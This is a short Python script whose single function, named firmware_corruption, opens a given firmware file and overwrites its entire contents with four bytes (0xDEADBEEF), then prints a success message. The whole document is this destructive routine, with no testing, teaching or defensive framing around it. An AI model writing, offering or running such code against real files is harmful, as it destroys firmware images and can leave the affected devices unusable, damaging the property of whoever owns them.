import struct

def firmware_corruption(file_path):
    with open(file_path, 'rb') as f:
        firmware_data = f.read()
        
    corrupted_data = struct.pack('BBBB', 0xde, 0xad, 0xbe, 0xef)
    
    with open(file_path, 'wb') as f:
        f.write(corrupted_data)
    
    print("Firmware corrupted successfully.")